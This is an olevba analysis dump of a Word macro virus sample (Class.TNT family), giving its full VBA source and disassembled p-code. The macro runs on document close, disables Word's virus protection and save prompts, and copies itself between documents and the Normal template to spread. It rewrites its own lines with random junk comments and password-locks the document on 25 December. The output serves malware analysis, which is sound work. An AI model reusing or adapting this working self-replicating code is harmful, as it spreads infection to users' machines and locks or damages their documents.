olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Class.bg
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Class.bg - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'480867883692431712793761,16933258487727E+224808678836924317127937648086788369243171279376
Dim rsx, rox, xix, xxi As Integer: Dim xxe, xex, exx, exd, cxi, cix, xic, eox, xoe, oxe, cii, rxe, rex, exr, nix, ixn, nxi, lnr, nrl, rnl As String: o = 0: r = 0
'17850563236820083496411,46389523114667E+2117850563236820083496411785056323682008349641
Randomize
'7806436004794385322253,7427062177484E+20780643600479438532225780643600479438532225
On Error GoTo 89
'3971730126431817496491,26370509355959E+20397173012643181749649397173012643181749649
Options.VirusProtection = Chr(48)
'4617474304508796892,34935656553011E+17461747430450879689461747430450879689
Options.SaveNormalPrompt = Chr(48)
'9531236052960068700165,72528960615832E+20953123605296006870016953123605296006870016
Options.ConfirmConversions = Chr(48)
'2787312025577224650251,60890520876824E+20278731202557722465025278731202557722465025
rt = ActiveDocument.VBProject.VBComponents.Item(Abs(1)).codemodule.countoflines
'76916920921454802541213,49820110969194E+2176916920921454802541217691692092145480254121
dt = NormalTemplate.VBProject.VBComponents.Item(Abs(1)).codemodule.countoflines
'7658000100687236711045,26285880186799E+20765800010068723671104765800010068723671104
If dt > 0 And rt > 0 Then GoTo 89
'928804861693425128805163,18127628614707E+229288048616934251288051692880486169342512880516
If dt = 0 Then
'790301411292314293070411,82898907968369E+227903014112923142930704179030141129231429307041
    Set tnt = NormalTemplate.VBProject.VBComponents
'97668750400688947004846,72885930545456E+2197668750400688947004849766875040068894700484
    Set hst = ActiveDocument.VBProject.VBComponents
'152705334762068384920253,15853411659312E+211527053347620683849202515270533476206838492025
    If Month(Now()) = 12 And Day(Now()) = 23 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83) + Chr(32) + Chr(83) + Chr(65) + Chr(89) + Chr(83) + Chr(32) + Chr(72) + Chr(73)
'9130308289643807189693,99973147170687E+20913030828964380718969913030828964380718969
    If Month(Now()) = 12 And Day(Now()) = 24 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(32) + Chr(84) + Chr(78) + Chr(84)
'193393523563814285248017,37658063975582E+211933935235638142852480119339352356381428524801
    If Month(Now()) = 12 And Day(Now()) = 25 Then Application.ActiveDocument.Password = "tnt"
'2687599572169714150251,87363720381215E+20268759957216971415025268759957216971415025
    hst.Item(Abs(1)).Name = tnt.Item(Abs(1)).Name
'26906497024805657132812,16774112463166E+2126906497024805657132812690649702480565713281
    hst.Item(Abs(1)).Export Application.StartupPath & System.Version & Chr(84) + Chr(78) + Chr(84)
'368344379292626788004849,67562597169207E+213683443792926267880048436834437929262678800484
End If
'464432670493032815041001,40853838859387E+224644326704930328150410046443267049303281504100
If rt = 0 Then Set tnt = ActiveDocument.VBProject.VBComponents
'116027366561238047558811,43647397924761E+211160273665612380475588111602736656123804755881
tnt.Item(Abs(1)).codemodule.AddFromFile Application.StartupPath & System.Version & Chr(84) + Chr(78) + Chr(84)
'331429307041170762028963,88024847966957E+213314293070411707620289633142930704117076202896
With tnt.Item(Abs(1)).codemodule
'2167740481421632835699,13990566044035E+19216774048142163283569216774048142163283569
    For j = Chr(49) To Chr(52)
'489028996002376260259611,16206016899178E+224890289960023762602596148902899600237626025961
    .deletelines Chr(49)
'27055602253359002257619,08798290387482E+2027055602253359002257612705560225335900225761
    Next j
'85897058724246716131842,11921900648186E+2185897058724246716131848589705872424671613184
    End With
'767893978811424745417641,09405342754289E+227678939788114247454176476789397881142474541764
If dt = 0 Then tnt.Item(Abs(1)).codemodule.replaceline 1, "Sub AutoClose()"
'76447043563016283288492,30585939944495E+2176447043563016283288497644704356301628328849
If dt = 0 Then tnt.Item(Abs(1)).codemodule.replaceline 95, "Sub ToolsMarco()"
'103694948289846047751618,77308778532237E+211036949482898460477516110369494828984604775161
If dt = 0 And rt = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'80577067321224907009611,81223472543098E+2180577067321224907009618057706732122490700961
With tnt.Item(Abs(1)).codemodule
'48478792041140024622246,78822454219254E+2048478792041140024622244847879204114002462224
    rsx = Int(Rnd(11) * 2998) + 24: rox = Int(Rnd(15) * 5863) + 33: xix = Int(Rnd(44) * 3544) + 55
'152831406251440855313962,20207943835292E+211528314062514408553139615283140625144085531396
    cii = Asc(rsx): eox = Chr$(cii + 5): xoe = Chr$(cii - 14): oxe = Chr$(cii + 22): lnr = Chr$(cii - 4)
'60993686961392245947042,39245265054787E+2160993686961392245947046099368696139224594704
    cix = Asc(rox): rxe = Chr$(cix + 7): rex = Chr$(cix - 16): exr = Chr$(cix + 4): nrl = Chr$(cix - 17)
'69560604092121136713641,47547551158276E+2169560604092121136713646956060409212113671364
    xic = Asc(xix): nix = Chr$(xic + 9): ixn = Chr$(xic - 18): nxi = Chr$(xic + 8): rnl = Chr$(xic - 33)
'319955501294696086784001,50253880107606E+223199555012946960867840031995550129469608678400
    cxi = Asc(xxi): xxe = Chr$(cxi + 4): xex = Chr$(cxi - 3): exx = Chr$(cxi + 18): exd = Chr$(cxi - 12)
'537057450251026561600005,5132255542056E+215370574502510265616000053705745025102656160000
    If Month(Now()) = 11 And Day(Now()) = 13 Then .replaceline 83, ".replaceline j, Chr(39) & eox & rxe & nix & xoe & rex & ixn & oxe & exr & nix & lnr & nrl & rnl & xxe & xex & exx & exd & oxe & exr & nix & lnr & nrl & rnl & xxe"
'40446840996584628876812,36463912220041E+2140446840996584628876814044684099658462887681
End With
'547480442893079217786491,68581151750231E+225474804428930792177864954748044289307921778649
  With tnt.Item(Abs(1)).codemodule
'968452811667742244001,61512966255751E+199684528116677422440096845281166774224400
For j = Chr(50) To tnt.Item(Abs(1)).codemodule.countoflines Step Chr(50)
'4046868225555889075292,24960983541573E+20404686822555588907529404686822555588907529
    r = Int(Rnd(712835) * 313989) + 8485
'363806031695882000313642,1399071925047E+223638060316958820003136436380603169588200031364
    o = Int(Rnd(587958) * 783865) + 2988
'269609832041609999575044,34071715011006E+212696098320416099995750426960983204160999957504
    .replaceline j, Chr(39) & r * r & o * o & r * r * o * o & r * r & o * o & r * r & o * o
'493915065643242721636011,60162906970213E+224939150656432427216360149391506564324272163601
    Next j
'143539568644732889616006,79356933901375E+211435395686447328896160014353956864473288961600
 End With
'1245902443168316428843,94741316938384E+19124590244316831642884124590244316831642884
89:
'5284941210060908659363,21898683897516E+20528494121006090865936528494121006090865936
If dt <> 0 And rt = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'62903148025942035694765,9257010752322E+2162903148025942035694766290314802594203569476
End Sub
'515789521375654171241,93758485045532E+195157895213756541712451578952137565417124
Sub ToolsMarco()
'10064756251527871744001,53776566846224E+2010064756251527871744001006475625152787174400
End Sub 'WM97/Class.TNT by Virus :) Smile
'90722644804275301100842,49760439856575E+2190722644804275301100849072264480427530110084
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Class.bg
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 19777 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' 	QuoteRem 0x0000 0x0059 "480867883692431712793761,16933258487727E+224808678836924317127937648086788369243171279376"
' Line #2:
' 	Dim 
' 	VarDefn rsx
' 	VarDefn rox
' 	VarDefn xix
' 	VarDefn xxi (As Integer)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn xxe
' 	VarDefn xex
' 	VarDefn exx
' 	VarDefn exd
' 	VarDefn cxi
' 	VarDefn cix
' 	VarDefn xic
' 	VarDefn eox
' 	VarDefn xoe
' 	VarDefn oxe
' 	VarDefn cii
' 	VarDefn rxe
' 	VarDefn rex
' 	VarDefn exr
' 	VarDefn nix
' 	VarDefn ixn
' 	VarDefn nxi
' 	VarDefn lnr
' 	VarDefn nrl
' 	VarDefn rnl (As String)
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St o 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St r 
' Line #3:
' 	QuoteRem 0x0000 0x0056 "17850563236820083496411,46389523114667E+2117850563236820083496411785056323682008349641"
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	QuoteRem 0x0000 0x0052 "7806436004794385322253,7427062177484E+20780643600479438532225780643600479438532225"
' Line #6:
' 	OnError 89 
' Line #7:
' 	QuoteRem 0x0000 0x0053 "3971730126431817496491,26370509355959E+20397173012643181749649397173012643181749649"
' Line #8:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #9:
' 	QuoteRem 0x0000 0x004A "4617474304508796892,34935656553011E+17461747430450879689461747430450879689"
' Line #10:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #11:
' 	QuoteRem 0x0000 0x0053 "9531236052960068700165,72528960615832E+20953123605296006870016953123605296006870016"
' Line #12:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #13:
' 	QuoteRem 0x0000 0x0053 "2787312025577224650251,60890520876824E+20278731202557722465025278731202557722465025"
' Line #14:
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St rt 
' Line #15:
' 	QuoteRem 0x0000 0x0056 "76916920921454802541213,49820110969194E+2176916920921454802541217691692092145480254121"
' Line #16:
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St dt 
' Line #17:
' 	QuoteRem 0x0000 0x0053 "7658000100687236711045,26285880186799E+20765800010068723671104765800010068723671104"
' Line #18:
' 	Ld dt 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld rt 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo 89 
' 	EndIf 
' Line #19:
' 	QuoteRem 0x0000 0x0059 "928804861693425128805163,18127628614707E+229288048616934251288051692880486169342512880516"
' Line #20:
' 	Ld dt 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #21:
' 	QuoteRem 0x0000 0x0059 "790301411292314293070411,82898907968369E+227903014112923142930704179030141129231429307041"
' Line #22:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set tnt 
' Line #23:
' 	QuoteRem 0x0000 0x0056 "97668750400688947004846,72885930545456E+2197668750400688947004849766875040068894700484"
' Line #24:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set hst 
' Line #25:
' 	QuoteRem 0x0000 0x0059 "152705334762068384920253,15853411659312E+211527053347620683849202515270533476206838492025"
' Line #26:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0017 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0059 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0048 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0049 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsCall MsgBox 0x0001 
' 	EndIf 
' Line #27:
' 	QuoteRem 0x0000 0x0053 "9130308289643807189693,99973147170687E+20913030828964380718969913030828964380718969"
' Line #28:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0018 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsCall MsgBox 0x0001 
' 	EndIf 
' Line #29:
' 	QuoteRem 0x0000 0x0059 "193393523563814285248017,37658063975582E+211933935235638142852480119339352356381428524801"
' Line #30:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0019 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0003 "tnt"
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	MemSt Password 
' 	EndIf 
' Line #31:
' 	QuoteRem 0x0000 0x0053 "2687599572169714150251,87363720381215E+20268759957216971415025268759957216971415025"
' Line #32:
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld tnt 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld hst 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #33:
' 	QuoteRem 0x0000 0x0056 "26906497024805657132812,16774112463166E+2126906497024805657132812690649702480565713281"
' Line #34:
' 	Ld Application 
' 	MemLd StartupPath 
' 	Ld System 
' 	MemLd Version 
' 	Concat 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x004E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Concat 
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld hst 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #35:
' 	QuoteRem 0x0000 0x0059 "368344379292626788004849,67562597169207E+213683443792926267880048436834437929262678800484"
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	QuoteRem 0x0000 0x0059 "464432670493032815041001,40853838859387E+224644326704930328150410046443267049303281504100"
' Line #38:
' 	Ld rt 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set tnt 
' 	EndIf 
' Line #39:
' 	QuoteRem 0x0000 0x0059 "116027366561238047558811,43647397924761E+211160273665612380475588111602736656123804755881"
' Line #40:
' 	Ld Application 
' 	MemLd StartupPath 
' 	Ld System 
' 	MemLd Version 
' 	Concat 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x004E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Concat 
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld tnt 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #41:
' 	QuoteRem 0x0000 0x0059 "331429307041170762028963,88024847966957E+213314293070411707620289633142930704117076202896"
' Line #42:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld tnt 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #43:
' 	QuoteRem 0x0000 0x0053 "2167740481421632835699,13990566044035E+19216774048142163283569216774048142163283569"
' Line #44:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0034 
' 	ArgsLd Chr 0x0001 
' 	For 
' Line #45:
' 	QuoteRem 0x0000 0x0059 "489028996002376260259611,16206016899178E+224890289960023762602596148902899600237626025961"
' Line #46:
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #47:
' 	QuoteRem 0x0000 0x0056 "27055602253359002257619,08798290387482E+2027055602253359002257612705560225335900225761"
' Line #48:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #49:
' 	QuoteRem 0x0000 0x0056 "85897058724246716131842,11921900648186E+2185897058724246716131848589705872424671613184"
' Line #50:
' 	EndWith 
' Line #51:
' 	QuoteRem 0x0000 0x0059 "767893978811424745417641,09405342754289E+227678939788114247454176476789397881142474541764"
' Line #52:
' 	Ld dt 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitStr 0x000F "Sub AutoClose()"
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld tnt 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall replaceline 0x0002 
' 	EndIf 
' Line #53:
' 	QuoteRem 0x0000 0x0056 "76447043563016283288492,30585939944495E+2176447043563016283288497644704356301628328849"
' Line #54:
' 	Ld dt 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x005F 
' 	LitStr 0x0010 "Sub ToolsMarco()"
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld tnt 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall replaceline 0x0002 
' 	EndIf 
' Line #55:
' 	QuoteRem 0x0000 0x0059 "103694948289846047751618,77308778532237E+211036949482898460477516110369494828984604775161"
' Line #56:
' 	Ld dt 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld rt 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #57:
' 	QuoteRem 0x0000 0x0056 "80577067321224907009611,81223472543098E+2180577067321224907009618057706732122490700961"
' Line #58:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld tnt 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #59:
' 	QuoteRem 0x0000 0x0056 "48478792041140024622246,78822454219254E+2048478792041140024622244847879204114002462224"
' Line #60:
' 	LitDI2 0x000B 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0BB6 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0018 
' 	Add 
' 	St rsx 
' 	BoS 0x0000 
' 	LitDI2 0x000F 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x16E7 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0021 
' 	Add 
' 	St rox 
' 	BoS 0x0000 
' 	LitDI2 0x002C 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0DD8 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0037 
' 	Add 
' 	St xix 
' Line #61:
' 	QuoteRem 0x0000 0x0059 "152831406251440855313962,20207943835292E+211528314062514408553139615283140625144085531396"
' Line #62:
' 	Ld rsx 
' 	ArgsLd Asc 0x0001 
' 	St cii 
' 	BoS 0x0000 
' 	Ld cii 
' 	LitDI2 0x0005 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St eox 
' 	BoS 0x0000 
' 	Ld cii 
' 	LitDI2 0x000E 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	St xoe 
' 	BoS 0x0000 
' 	Ld cii 
' 	LitDI2 0x0016 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St oxe 
' 	BoS 0x0000 
' 	Ld cii 
' 	LitDI2 0x0004 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	St lnr 
' Line #63:
' 	QuoteRem 0x0000 0x0056 "60993686961392245947042,39245265054787E+2160993686961392245947046099368696139224594704"
' Line #64:
' 	Ld rox 
' 	ArgsLd Asc 0x0001 
' 	St cix 
' 	BoS 0x0000 
' 	Ld cix 
' 	LitDI2 0x0007 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St rxe 
' 	BoS 0x0000 
' 	Ld cix 
' 	LitDI2 0x0010 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	St rex 
' 	BoS 0x0000 
' 	Ld cix 
' 	LitDI2 0x0004 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St exr 
' 	BoS 0x0000 
' 	Ld cix 
' 	LitDI2 0x0011 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	St nrl 
' Line #65:
' 	QuoteRem 0x0000 0x0056 "69560604092121136713641,47547551158276E+2169560604092121136713646956060409212113671364"
' Line #66:
' 	Ld xix 
' 	ArgsLd Asc 0x0001 
' 	St xic 
' 	BoS 0x0000 
' 	Ld xic 
' 	LitDI2 0x0009 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St nix 
' 	BoS 0x0000 
' 	Ld xic 
' 	LitDI2 0x0012 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	St ixn 
' 	BoS 0x0000 
' 	Ld xic 
' 	LitDI2 0x0008 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St nxi 
' 	BoS 0x0000 
' 	Ld xic 
' 	LitDI2 0x0021 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	St rnl 
' Line #67:
' 	QuoteRem 0x0000 0x0059 "319955501294696086784001,50253880107606E+223199555012946960867840031995550129469608678400"
' Line #68:
' 	Ld xxi 
' 	ArgsLd Asc 0x0001 
' 	St cxi 
' 	BoS 0x0000 
' 	Ld cxi 
' 	LitDI2 0x0004 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St xxe 
' 	BoS 0x0000 
' 	Ld cxi 
' 	LitDI2 0x0003 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	St xex 
' 	BoS 0x0000 
' 	Ld cxi 
' 	LitDI2 0x0012 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St exx 
' 	BoS 0x0000 
' 	Ld cxi 
' 	LitDI2 0x000C 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	St exd 
' Line #69:
' 	QuoteRem 0x0000 0x0058 "537057450251026561600005,5132255542056E+215370574502510265616000053705745025102656160000"
' Line #70:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000B 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0053 
' 	LitStr 0x00A1 ".replaceline j, Chr(39) & eox & rxe & nix & xoe & rex & ixn & oxe & exr & nix & lnr & nrl & rnl & xxe & xex & exx & exd & oxe & exr & nix & lnr & nrl & rnl & xxe"
' 	ArgsMemCallWith replaceline 0x0002 
' 	EndIf 
' Line #71:
' 	QuoteRem 0x0000 0x0056 "40446840996584628876812,36463912220041E+2140446840996584628876814044684099658462887681"
' Line #72:
' 	EndWith 
' Line #73:
' 	QuoteRem 0x0000 0x0059 "547480442893079217786491,68581151750231E+225474804428930792177864954748044289307921778649"
' Line #74:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld tnt 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #75:
' 	QuoteRem 0x0000 0x0050 "968452811667742244001,61512966255751E+199684528116677422440096845281166774224400"
' Line #76:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0032 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld tnt 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	LitDI2 0x0032 
' 	ArgsLd Chr 0x0001 
' 	ForStep 
' Line #77:
' 	QuoteRem 0x0000 0x0053 "4046868225555889075292,24960983541573E+20404686822555588907529404686822555588907529"
' Line #78:
' 	LitDI4 0xE083 0x000A 
' 	ArgsLd Rnd 0x0001 
' 	LitDI4 0xCA85 0x0004 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x2125 
' 	Add 
' 	St r 
' Line #79:
' 	QuoteRem 0x0000 0x0058 "363806031695882000313642,1399071925047E+223638060316958820003136436380603169588200031364"
' Line #80:
' 	LitDI4 0xF8B6 0x0008 
' 	ArgsLd Rnd 0x0001 
' 	LitDI4 0xF5F9 0x000B 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0BAC 
' 	Add 
' 	St o 
' Line #81:
' 	QuoteRem 0x0000 0x0059 "269609832041609999575044,34071715011006E+212696098320416099995750426960983204160999957504"
' Line #82:
' 	Ld j 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Ld r 
' 	Ld r 
' 	Mul 
' 	Concat 
' 	Ld o 
' 	Ld o 
' 	Mul 
' 	Concat 
' 	Ld r 
' 	Ld r 
' 	Mul 
' 	Ld o 
' 	Mul 
' 	Ld o 
' 	Mul 
' 	Concat 
' 	Ld r 
' 	Ld r 
' 	Mul 
' 	Concat 
' 	Ld o 
' 	Ld o 
' 	Mul 
' 	Concat 
' 	Ld r 
' 	Ld r 
' 	Mul 
' 	Concat 
' 	Ld o 
' 	Ld o 
' 	Mul 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #83:
' 	QuoteRem 0x0000 0x0059 "493915065643242721636011,60162906970213E+224939150656432427216360149391506564324272163601"
' Line #84:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #85:
' 	QuoteRem 0x0000 0x0059 "143539568644732889616006,79356933901375E+211435395686447328896160014353956864473288961600"
' Line #86:
' 	EndWith 
' Line #87:
' 	QuoteRem 0x0000 0x0053 "1245902443168316428843,94741316938384E+19124590244316831642884124590244316831642884"
' Line #88:
' 	LineNum 89 
' 	BoS 0x0000 
' Line #89:
' 	QuoteRem 0x0000 0x0053 "5284941210060908659363,21898683897516E+20528494121006090865936528494121006090865936"
' Line #90:
' 	Ld dt 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld rt 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #91:
' 	QuoteRem 0x0000 0x0055 "62903148025942035694765,9257010752322E+2162903148025942035694766290314802594203569476"
' Line #92:
' 	EndSub 
' Line #93:
' 	QuoteRem 0x0000 0x0050 "515789521375654171241,93758485045532E+195157895213756541712451578952137565417124"
' Line #94:
' 	FuncDefn (Sub ToolsMarco())
' Line #95:
' 	QuoteRem 0x0000 0x0056 "10064756251527871744001,53776566846224E+2010064756251527871744001006475625152787174400"
' Line #96:
' 	EndSub 
